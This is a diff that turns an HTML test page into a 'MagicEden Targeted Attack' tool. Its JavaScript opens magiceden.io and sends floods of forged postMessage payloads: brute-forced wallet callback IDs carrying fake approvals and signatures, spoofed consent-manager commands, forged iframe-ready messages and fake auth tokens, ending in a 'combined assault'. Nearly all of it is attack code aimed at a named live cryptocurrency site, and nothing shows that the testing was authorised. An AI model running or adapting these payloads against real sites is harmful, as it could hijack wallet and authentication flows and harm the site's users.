@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>MagicEden Simple Tests</title>
+    <title>MagicEden Targeted Attack</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,8 +14,15 @@
         
         h1 {
             color: #333;
-            border-bottom: 3px solid #667eea;
+            border-bottom: 3px solid #dc3545;
             padding-bottom: 10px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
         }
         
         .test-box {
@@ -27,36 +34,43 @@
         }
         
         .test-box h3 {
-            color: #667eea;
+            color: #dc3545;
             margin-top: 0;
         }
         
+        .code-box {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 10px 0;
+            border-left: 3px solid #667eea;
+        }
+        
         button {
-            background: #667eea;
+            background: #dc3545;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
             margin: 5px;
-        }
-        
-        button:hover {
-            background: #5568d3;
-        }
-        
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
             font-weight: bold;
         }
         
-        .waiting { background: #fff3cd; color: #856404; }
-        .testing { background: #d1ecf1; color: #0c5460; }
-        .success { background: #d4edda; color: #155724; }
-        .vulnerable { background: #f8d7da; color: #721c24; }
+        button:hover {
+            background: #c82333;
+        }
+        
+        button.safe {
+            background: #28a745;
+        }
+        
+        button.safe:hover {
+            background: #218838;
+        }
         
         #log {
             background: #1e1e1e;
@@ -64,264 +78,351 @@
             padding: 15px;
             border-radius: 5px;
             font-family: monospace;
-            font-size: 12px;
-            height: 400px;
+            font-size: 13px;
+            height: 500px;
             overflow-y: auto;
             margin-top: 20px;
         }
         
-        .msg-received {
+        .received {
             color: #4ade80;
             font-weight: bold;
         }
         
-        .msg-sent {
+        .sent {
             color: #60a5fa;
         }
         
-        .msg-error {
+        .error {
             color: #f87171;
+            font-weight: bold;
+        }
+        
+        .warning-log {
+            color: #fbbf24;
             font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h1>🔍 MagicEden Simple Test Suite</h1>
+    <h1>🎯 MagicEden Code-Based Attack Vectors</h1>
     
-    <div class="test-box">
-        <h3>Test 1: Basic PostMessage to MagicEden</h3>
-        <p>Opens MagicEden and sends basic messages</p>
-        <button onclick="test1()">Run Test 1</button>
-        <div id="status1" class="status waiting">Ready to test</div>
+    <div class="warning">
+        <strong>⚠️ Based on the actual MagicEden code listeners:</strong><br>
+        Testing exact patterns from listeners #1-9 in the provided code
     </div>
     
     <div class="test-box">
-        <h3>Test 2: Intercom Message Spoofing</h3>
-        <p>Sends intercom-like messages we detected earlier</p>
-        <button onclick="test2()">Run Test 2</button>
-        <div id="status2" class="status waiting">Ready to test</div>
+        <h3>Attack 1: Listener Pattern Matching (listeners #1, #2, #3)</h3>
+        <div class="code-box">
+            Pattern: ({source:e,data:t})=>{e===K&&t===r&&i.length&&i.shift()()}<br>
+            Target: Checks if source matches specific value and data matches 'r'
+        </div>
+        <p>Tries to trigger callbacks by matching source/data patterns</p>
+        <button onclick="attack1()">🔥 ATTACK 1</button>
     </div>
     
     <div class="test-box">
-        <h3>Test 3: Callback ID Bruteforce</h3>
-        <p>Tries different callback IDs from the code</p>
-        <button onclick="test3()">Run Test 3</button>
-        <div id="status3" class="status waiting">Ready to test</div>
+        <h3>Attack 2: Wallet Origin Bypass (listener #4)</h3>
+        <div class="code-box">
+            Pattern: if(e.origin!==this.walletOrigin)return;<br>
+            Target: Wallet callback handler - tries to spoof walletOrigin
+        </div>
+        <p>Attempts to bypass wallet origin check and trigger callbacks</p>
+        <button onclick="attack2()">🔥 ATTACK 2</button>
     </div>
     
     <div class="test-box">
-        <h3>Test 4: Null Origin Attack</h3>
-        <p>Creates null origin iframe to bypass checks</p>
-        <button onclick="test4()">Run Test 4</button>
-        <div id="status4" class="status waiting">Ready to test</div>
+        <h3>Attack 3: Tcf/Osano Command Injection (listener #5)</h3>
+        <div class="code-box">
+            Pattern: {command:n,parameter:r,version:s,callId:a}<br>
+            Target: __tcfapiCall / __cmpCall handlers
+        </div>
+        <p>Injects commands into consent management platform handlers</p>
+        <button onclick="attack3()">🔥 ATTACK 3</button>
     </div>
     
     <div class="test-box">
-        <h3>Test 5: WAAS Commands</h3>
-        <p>Sends wallet-related commands</p>
-        <button onclick="test5()">Run Test 5</button>
-        <div id="status5" class="status waiting">Ready to test</div>
+        <h3>Attack 4: Iframe Instance Hijacking (listener #6)</h3>
+        <div class="code-box">
+            Pattern: a.data==`iframe-ready-${this.instanceId}`<br>
+            Target: Iframe initialization - tries to spoof ready message
+        </div>
+        <p>Attempts to hijack iframe with predictable instance IDs</p>
+        <button onclick="attack4()">🔥 ATTACK 4</button>
     </div>
     
     <div class="test-box">
-        <h3>Test 6: Origin Field Spoofing</h3>
-        <p>Tests origin validation bypass</p>
-        <button onclick="test6()">Run Test 6</button>
-        <div id="status6" class="status waiting">Ready to test</div>
+        <h3>Attack 5: Auth Frame Bridge (listener #7, #8, #9)</h3>
+        <div class="code-box">
+            Pattern: auth.magiceden.io frames checking origin === "host"<br>
+            Target: WAAS authentication flow
+        </div>
+        <p>Tests auth frame message handling</p>
+        <button onclick="attack5()">🔥 ATTACK 5</button>
+    </div>
+    
+    <div class="test-box">
+        <h3>🔴 COMBINED ASSAULT</h3>
+        <p>Runs ALL attacks simultaneously with message flooding</p>
+        <button onclick="attackAll()" style="font-size: 18px; padding: 15px 30px;">💣 RUN ALL ATTACKS</button>
     </div>
     
     <div id="log"></div>
-    <button onclick="clearLog()" style="background: #dc3545;">Clear Log</button>
+    <button onclick="clearLog()" class="safe">Clear Log</button>
+    <button onclick="location.reload()" class="safe">Reset Page</button>
     
     <script>
         const TARGET = 'https://magiceden.io';
-        const WAIT_TIME = 15000; // 15 seconds
-        let testWindow = null;
-        let messageCount = 0;
+        const AUTH_TARGET = 'https://auth.magiceden.io';
+        const WAIT = 15000;
+        let win = null;
+        let msgCount = 0;
         
-        // Simple logging
-        function log(msg, type = 'info') {
-            const logDiv = document.getElementById('log');
+        function log(msg, type = 'sent') {
+            const div = document.getElementById('log');
             const time = new Date().toLocaleTimeString();
-            let className = 'msg-sent';
-            
-            if (type === 'received') className = 'msg-received';
-            if (type === 'error') className = 'msg-error';
-            
-            logDiv.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+            div.innerHTML += '<div class="' + type + '">[' + time + '] ' + msg + '</div>';
+            div.scrollTop = div.scrollHeight;
             console.log(msg);
         }
         
         function clearLog() {
             document.getElementById('log').innerHTML = '';
-            messageCount = 0;
+            msgCount = 0;
         }
         
-        function setStatus(testNum, status, text) {
-            const el = document.getElementById('status' + testNum);
-            el.className = 'status ' + status;
-            el.textContent = text;
-        }
-        
-        // Listen for ALL messages
+        // Global listener
         window.addEventListener('message', function(e) {
-            messageCount++;
-            log('📨 RECEIVED #' + messageCount + ' from: ' + e.origin, 'received');
-            log('   Data: ' + JSON.stringify(e.data), 'received');
+            msgCount++;
+            log('📨 MSG #' + msgCount + ' FROM: ' + e.origin, 'received');
+            log('   DATA: ' + JSON.stringify(e.data).substring(0, 200), 'received');
             
-            // Check for interesting patterns
-            const dataStr = JSON.stringify(e.data);
-            if (dataStr.includes('error') || dataStr.includes('Error')) {
-                log('   ⚠️ ERROR DETECTED!', 'error');
+            const str = JSON.stringify(e.data);
+            if (str.includes('error') || str.includes('Error')) {
+                log('   🚨 ERROR IN RESPONSE!', 'error');
             }
-            if (dataStr.includes('wallet') || dataStr.includes('waas')) {
-                log('   🎯 WALLET RELATED!', 'error');
+            if (str.includes('success') || str.includes('returnValue')) {
+                log('   ⚡ CALLBACK EXECUTED!', 'error');
+            }
+            if (str.includes('wallet') || str.includes('waas') || str.includes('auth')) {
+                log('   💰 WALLET/AUTH RELATED!', 'warning-log');
             }
         });
         
-        // Test 1: Basic Messages
-        function test1() {
-            log('=== TEST 1 STARTED ===');
-            setStatus(1, 'testing', 'Opening MagicEden...');
-            
-            testWindow = window.open(TARGET, 'test1');
+        // Attack 1: Source/Data pattern matching
+        function attack1() {
+            log('=== ATTACK 1: SOURCE/DATA PATTERN ===', 'error');
+            win = window.open(TARGET, 'attack1');
             
             setTimeout(function() {
-                log('Sending basic messages...');
+                log('Trying source/data combinations...');
                 
-                testWindow.postMessage({test: 'hello'}, '*');
-                testWindow.postMessage({id: '1', data: 'test'}, '*');
-                testWindow.postMessage('simple-string', '*');
+                // Try different source values (K, W, eV from code)
+                const sources = ['K', 'W', 'eV', 'r', 'source'];
+                const dataValues = ['r', 'data', true, 1];
                 
-                log('✅ Test 1 complete');
-                setStatus(1, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME);
+                sources.forEach(function(src) {
+                    dataValues.forEach(function(dat) {
+                        win.postMessage({source: src, data: dat}, '*');
+                    });
+                });
+                
+                log('Sent ' + (sources.length * dataValues.length) + ' pattern attempts');
+            }, WAIT);
         }
         
-        // Test 2: Intercom Spoofing
-        function test2() {
-            log('=== TEST 2 STARTED ===');
-            setStatus(2, 'testing', 'Testing Intercom...');
-            
-            testWindow = window.open(TARGET, 'test2');
+        // Attack 2: Wallet callback bypass
+        function attack2() {
+            log('=== ATTACK 2: WALLET CALLBACK BYPASS ===', 'error');
+            win = window.open(TARGET, 'attack2');
             
             setTimeout(function() {
-                log('Sending Intercom messages...');
+                log('Attempting wallet callback injection...');
                 
-                testWindow.postMessage({type: 'intercom-snippet__ready'}, '*');
-                testWindow.postMessage({type: 'intercom-command', command: 'test'}, '*');
-                
-                log('✅ Test 2 complete');
-                setStatus(2, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME);
-        }
-        
-        // Test 3: Callback IDs
-        function test3() {
-            log('=== TEST 3 STARTED ===');
-            setStatus(3, 'testing', 'Bruteforcing IDs...');
-            
-            testWindow = window.open(TARGET, 'test3');
-            
-            setTimeout(function() {
-                log('Sending 50 callback attempts...');
-                
-                for (let i = 0; i < 50; i++) {
-                    testWindow.postMessage({
-                        id: i.toString(),
-                        data: 'hijack-' + i,
-                        returnValue: 'test'
+                // Try to trigger callbacks with IDs
+                for (let i = 0; i < 100; i++) {
+                    win.postMessage({
+                        id: i,
+                        returnValue: 'HIJACKED',
+                        success: true,
+                        wallet: 'attacker_address'
                     }, '*');
                 }
                 
-                log('✅ Test 3 complete');
-                setStatus(3, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME);
-        }
-        
-        // Test 4: Null Origin
-        function test4() {
-            log('=== TEST 4 STARTED ===');
-            setStatus(4, 'testing', 'Creating null origin...');
-            
-            const iframe = document.createElement('iframe');
-            iframe.sandbox = 'allow-scripts allow-popups';
-            iframe.style.display = 'none';
-            
-            const scriptContent = 
-                'var w = window.open("' + TARGET + '", "test4");' +
-                'setTimeout(function() {' +
-                '  w.postMessage({nullOrigin: true, test: "bypass"}, "*");' +
-                '  w.postMessage({id: "null-1", data: "attack"}, "*");' +
-                '}, ' + WAIT_TIME + ');';
-            
-            iframe.srcdoc = '<script>' + scriptContent + '<\/script>';
-            document.body.appendChild(iframe);
-            
-            log('Null origin iframe created');
-            
-            setTimeout(function() {
-                log('✅ Test 4 complete');
-                setStatus(4, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME + 2000);
-        }
-        
-        // Test 5: WAAS Commands
-        function test5() {
-            log('=== TEST 5 STARTED ===');
-            setStatus(5, 'testing', 'Testing WAAS...');
-            
-            testWindow = window.open(TARGET, 'test5');
-            
-            setTimeout(function() {
-                log('Sending WAAS commands...');
+                // Common wallet callback IDs
+                const ids = ['wallet-1', 'connect-1', 'auth-1', 'sign-1', 'tx-1'];
+                ids.forEach(function(id) {
+                    win.postMessage({
+                        id: id,
+                        returnValue: {approved: true, signature: 'FAKE'},
+                        success: true
+                    }, '*');
+                });
                 
-                testWindow.postMessage({
+                log('Sent 100+ wallet callback attempts');
+            }, WAIT);
+        }
+        
+        // Attack 3: TCF/CMP command injection
+        function attack3() {
+            log('=== ATTACK 3: TCF/CMP COMMAND INJECTION ===', 'error');
+            win = window.open(TARGET, 'attack3');
+            
+            setTimeout(function() {
+                log('Injecting consent management commands...');
+                
+                // __tcfapiCall pattern
+                win.postMessage({
+                    __tcfapiCall: {
+                        command: 'getVendorConsents',
+                        parameter: null,
+                        version: 2,
+                        callId: 1
+                    }
+                }, '*');
+                
+                // __cmpCall pattern
+                win.postMessage({
+                    __cmpCall: {
+                        command: 'getConsentData',
+                        parameter: null,
+                        callId: 1
+                    }
+                }, '*');
+                
+                // Try to get return messages
+                win.postMessage({
+                    __tcfapiReturn: {
+                        returnValue: {consent: true},
+                        success: true,
+                        callId: 1
+                    }
+                }, '*');
+                
+                log('Sent CMP command injections');
+            }, WAIT);
+        }
+        
+        // Attack 4: Iframe instance hijacking
+        function attack4() {
+            log('=== ATTACK 4: IFRAME INSTANCE HIJACK ===', 'error');
+            win = window.open(TARGET, 'attack4');
+            
+            setTimeout(function() {
+                log('Trying iframe-ready patterns...');
+                
+                // Common instance IDs
+                const patterns = [
+                    'iframe-ready-1',
+                    'iframe-ready-default',
+                    'iframe-ready-main',
+                    'iframe-ready-0',
+                    'iframe-ready-wallet',
+                    'iframe-ready-auth'
+                ];
+                
+                // Also try timestamp-based
+                for (let i = 0; i < 20; i++) {
+                    patterns.push('iframe-ready-' + (Date.now() - i * 1000));
+                }
+                
+                patterns.forEach(function(p) {
+                    win.postMessage(p, '*');
+                });
+                
+                log('Sent ' + patterns.length + ' iframe-ready attempts');
+            }, WAIT);
+        }
+        
+        // Attack 5: Auth frame bridge
+        function attack5() {
+            log('=== ATTACK 5: AUTH FRAME BRIDGE ===', 'error');
+            win = window.open(TARGET, 'attack5');
+            
+            setTimeout(function() {
+                log('Testing auth frame messages...');
+                
+                // Pattern from listener #9: origin === "host"
+                win.postMessage({
+                    origin: 'host',
+                    type: 'text',
+                    text: 'malicious'
+                }, '*');
+                
+                // WAAS patterns from auth.magiceden.io
+                win.postMessage({
                     waasCall: {
-                        command: 'test',
-                        parameter: 'value',
+                        command: 'authenticate',
+                        parameter: {user: 'attacker'},
+                        version: '1.0',
                         callId: '123'
                     }
                 }, '*');
                 
-                testWindow.postMessage({
+                win.postMessage({
                     waasReturn: {
-                        returnValue: 'hijacked',
+                        returnValue: {token: 'FAKE_TOKEN'},
                         success: true,
                         callId: '1'
                     }
                 }, '*');
                 
-                log('✅ Test 5 complete');
-                setStatus(5, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME);
+                log('Sent auth frame messages');
+            }, WAIT);
         }
         
-        // Test 6: Origin Spoofing
-        function test6() {
-            log('=== TEST 6 STARTED ===');
-            setStatus(6, 'testing', 'Testing origin...');
+        // Combined attack
+        function attackAll() {
+            log('=== 💣 COMBINED ASSAULT INITIATED ===', 'error');
+            log('Opening target...', 'error');
             
-            testWindow = window.open(TARGET, 'test6');
+            win = window.open(TARGET, 'combined');
             
             setTimeout(function() {
-                log('Sending origin spoofs...');
+                log('LAUNCHING ALL ATTACKS...', 'error');
                 
-                testWindow.postMessage({origin: 'host', data: 'test'}, '*');
-                testWindow.postMessage({origin: TARGET, data: 'spoof'}, '*');
-                testWindow.postMessage({origin: null, data: 'null'}, '*');
-                testWindow.postMessage({origin: '', data: 'empty'}, '*');
+                // Rapid-fire all patterns
+                let totalSent = 0;
                 
-                log('✅ Test 6 complete');
-                setStatus(6, 'success', '✅ Complete - Check log');
-            }, WAIT_TIME);
+                // Attack 1 patterns
+                ['K', 'W', 'eV'].forEach(function(s) {
+                    ['r', true].forEach(function(d) {
+                        win.postMessage({source: s, data: d}, '*');
+                        totalSent++;
+                    });
+                });
+                
+                // Attack 2 - callbacks
+                for (let i = 0; i < 50; i++) {
+                    win.postMessage({id: i, returnValue: 'HIJACK', success: true}, '*');
+                    totalSent++;
+                }
+                
+                // Attack 3 - CMP
+                win.postMessage({__tcfapiCall: {command: 'test', callId: 1}}, '*');
+                win.postMessage({__cmpCall: {command: 'test', callId: 1}}, '*');
+                totalSent += 2;
+                
+                // Attack 4 - iframe ready
+                for (let i = 0; i < 10; i++) {
+                    win.postMessage('iframe-ready-' + i, '*');
+                    totalSent++;
+                }
+                
+                // Attack 5 - auth
+                win.postMessage({origin: 'host', type: 'command'}, '*');
+                win.postMessage({waasCall: {command: 'test'}}, '*');
+                totalSent += 2;
+                
+                log('🔥 SENT ' + totalSent + ' MALICIOUS MESSAGES', 'error');
+                log('Watch for responses...', 'warning-log');
+            }, WAIT);
         }
         
-        // Init
-        log('🎯 Test Suite Ready');
-        log('Click any test button to start');
-        log('Messages will appear here in GREEN');
+        log('💀 ATTACK SUITE READY');
+        log('⚠️ Testing actual code patterns from MagicEden');
+        log('Click an attack button to begin');
     </script>
 </body>
 </html>
